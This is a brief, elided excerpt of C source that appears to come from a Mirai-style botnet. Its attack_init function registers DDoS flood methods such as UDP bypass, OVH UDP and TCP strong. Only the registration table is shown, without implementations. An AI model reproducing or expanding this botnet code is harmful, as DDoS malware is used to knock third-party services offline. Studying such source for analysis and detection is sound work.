...
BOOL attack_init(void)
{
	...
	add_attack(ATK_VEC_URGPLAIN, (ATTACK_FUNC)attack_method_synurgplain);
    ...
    add_attack(ATK_VEC_OVHUDP, (ATTACK_FUNC)attack_method_ovhudp);
    add_attack(ATK_VEC_TCPPLAIN, (ATTACK_FUNC)attack_method_tcpplain);
    add_attack(ATK_VEC_UDPKICK, (ATTACK_FUNC)attack_method_udpkick);
    add_attack(ATK_VEC_UDPBYPASS, (ATTACK_FUNC)attack_method_udpbypass);
    add_attack(ATK_VEC_STDPLAIN, (ATTACK_FUNC)attack_method_stdplain);
    add_attack(ATK_VEC_TCPSTRONG, (ATTACK_FUNC)attack_method_tcpstrong);
